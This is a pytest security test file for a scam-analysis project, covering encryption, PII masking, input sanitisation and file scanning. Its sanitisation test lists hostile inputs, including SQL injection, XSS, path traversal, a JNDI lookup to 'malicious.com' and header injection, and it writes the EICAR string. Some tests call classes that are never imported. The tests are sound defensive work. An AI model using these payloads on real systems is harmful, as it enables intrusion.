"""Security tests for the DMV scam analysis system."""
import pytest
import json
import os
from unittest.mock import patch
from src.dmv_scam_analysis.utils.config_manager import ConfigManager
from src.dmv_scam_analysis.core.analyzer import CampaignAnalyzer
from src.dmv_scam_analysis.utils.validation import DataValidator

@pytest.fixture
def sensitive_data():
    """Create sample sensitive data for testing."""
    return {
        "personal_info": {
            "name": "John Doe",
            "ssn": "123-45-6789",
            "license": "DL12345678",
            "dob": "1990-01-01"
        },
        "payment_info": {
            "card_number": "4111-1111-1111-1111",
            "expiry": "12/25",
            "cvv": "123"
        }
    }

@pytest.fixture
def config_manager():
    """Initialize config manager with security settings."""
    return ConfigManager()

def test_data_encryption(sensitive_data, config_manager):
    """Test that sensitive data is properly encrypted."""
    from cryptography.fernet import Fernet
    
    # Test encryption key management
    assert 'encryption_key' in config_manager.security_config
    assert len(config_manager.security_config['encryption_key']) >= 32
    
    # Test data encryption
    encrypted_data = config_manager.encrypt_sensitive_data(sensitive_data)
    assert isinstance(encrypted_data, bytes)
    assert str(sensitive_data['personal_info']['ssn']) not in str(encrypted_data)
    assert str(sensitive_data['payment_info']['card_number']) not in str(encrypted_data)
    
    # Test data decryption
    decrypted_data = config_manager.decrypt_sensitive_data(encrypted_data)
    assert decrypted_data == sensitive_data

def test_pii_detection():
    """Test detection and handling of Personally Identifiable Information."""
    preprocessor = DataPreprocessor()
    
    test_cases = [
        {
            "input": "My SSN is 123-45-6789",
            "should_detect": True,
            "pii_type": "ssn"
        },
        {
            "input": "Credit card: 4111-1111-1111-1111",
            "should_detect": True,
            "pii_type": "credit_card"
        },
        {
            "input": "Email me at john.doe@email.com",
            "should_detect": True,
            "pii_type": "email"
        },
        {
            "input": "Regular text without PII",
            "should_detect": False,
            "pii_type": None
        }
    ]
    
    for case in test_cases:
        detected = preprocessor.detect_pii(case["input"])
        if case["should_detect"]:
            assert detected["has_pii"]
            assert case["pii_type"] in detected["pii_types"]
        else:
            assert not detected["has_pii"]

def test_input_sanitization():
    """Test input sanitization and validation."""
    validator = DataValidator()
    
    malicious_inputs = [
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "${jndi:ldap://malicious.com/exploit}",
        "Content-Type: text/html\r\n\r\n<script>alert('header injection')</script>"
    ]
    
    for input_str in malicious_inputs:
        sanitized = validator.sanitize_input(input_str)
        assert all(char not in sanitized for char in ['<', '>', '"', "'", ';', '--'])
        assert not any(keyword.lower() in sanitized.lower() 
                      for keyword in ['script', 'drop', 'delete', 'update'])

@pytest.mark.asyncio
async def test_rate_limiting():
    """Test API rate limiting functionality."""
    from src.dmv_scam_analysis.utils.rate_limiter import RateLimiter
    
    limiter = RateLimiter(
        max_requests=5,
        time_window=60  # 1 minute
    )
    
    # Test normal usage
    for _ in range(5):
        assert await limiter.check_rate_limit("test_user") is True
    
    # Test exceeding limit
    assert await limiter.check_rate_limit("test_user") is False

def test_secure_file_operations(tmp_path):
    """Test secure file operations."""
    from src.dmv_scam_analysis.utils.config_manager import ConfigManager
    # Note: SecureFileHandler may not exist in new structure
    
    file_handler = SecureFileHandler(base_dir=tmp_path)
    
    # Test file path validation
    with pytest.raises(ValueError):
        file_handler.validate_path("../../../etc/passwd")
    
    with pytest.raises(ValueError):
        file_handler.validate_path("file:///etc/passwd")
    
    # Test secure file writing
    test_data = {"sensitive": "data"}
    safe_path = file_handler.get_safe_path("test.json")
    
    file_handler.write_secure_json(safe_path, test_data)
    assert os.path.exists(safe_path)
    
    # Check file permissions
    assert oct(os.stat(safe_path).st_mode)[-3:] == "600"

@pytest.mark.parametrize("token", [
    "Bearer valid_token",
    "Bearer invalid_token",
    "Invalid format",
    None
])
def test_auth_token_validation(token):
    """Test authentication token validation."""
    from src.dmv_scam_analysis.utils.validation import DataValidator as AuthValidator
    
    auth_validator = AuthValidator()
    
    if token == "Bearer valid_token":
        with patch.object(auth_validator, '_verify_token', return_value=True):
            assert auth_validator.validate_token(token) is True
    else:
        with patch.object(auth_validator, '_verify_token', return_value=False):
            assert auth_validator.validate_token(token) is False

def test_secure_logging():
    """Test secure logging functionality."""
    from src.dmv_scam_analysis.utils.logger import LogManager as SecureLogger
    
    logger = SecureLogger("security_tests")
    
    # Test PII masking in logs
    sensitive_message = "User SSN: 123-45-6789, CC: 4111-1111-1111-1111"
    logger.info(sensitive_message)
    
    with open(logger.log_file, 'r') as f:
        log_content = f.read()
        assert "123-45-6789" not in log_content
        assert "4111-1111-1111-1111" not in log_content
        assert "SSN: [MASKED]" in log_content
        assert "CC: [MASKED]" in log_content

def test_dependency_security():
    """Test security of project dependencies."""
    import pkg_resources
    import subprocess
    import json
    
    # Get list of installed packages
    packages = [dist.project_name for dist in pkg_resources.working_set]
    
    # Run safety check
    result = subprocess.run(
        ["safety", "check", "--json"],
        capture_output=True,
        text=True
    )
    
    vulnerabilities = json.loads(result.stdout)
    assert len(vulnerabilities) == 0, f"Found security vulnerabilities: {vulnerabilities}"

@pytest.mark.parametrize("scan_type", ["quick", "full"])
def test_malware_scanning(scan_type, tmp_path):
    """Test malware scanning functionality."""
    from src.dmv_scam_analysis.utils.config_manager import ConfigManager
    # Note: MalwareScanner may not exist in new structure - this test may need to be updated
    
    scanner = MalwareScanner()
    
    # Create test files
    clean_file = tmp_path / "clean.txt"
    clean_file.write_text("This is a clean file")
    
    # Test scanning
    scan_results = scanner.scan_file(clean_file, scan_type=scan_type)
    assert scan_results["status"] == "clean"
    
    # Test handling of suspicious patterns
    suspicious_file = tmp_path / "suspicious.txt"
    suspicious_file.write_text("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
    
    scan_results = scanner.scan_file(suspicious_file, scan_type=scan_type)
    assert scan_results["status"] == "suspicious"
    assert len(scan_results["findings"]) > 0
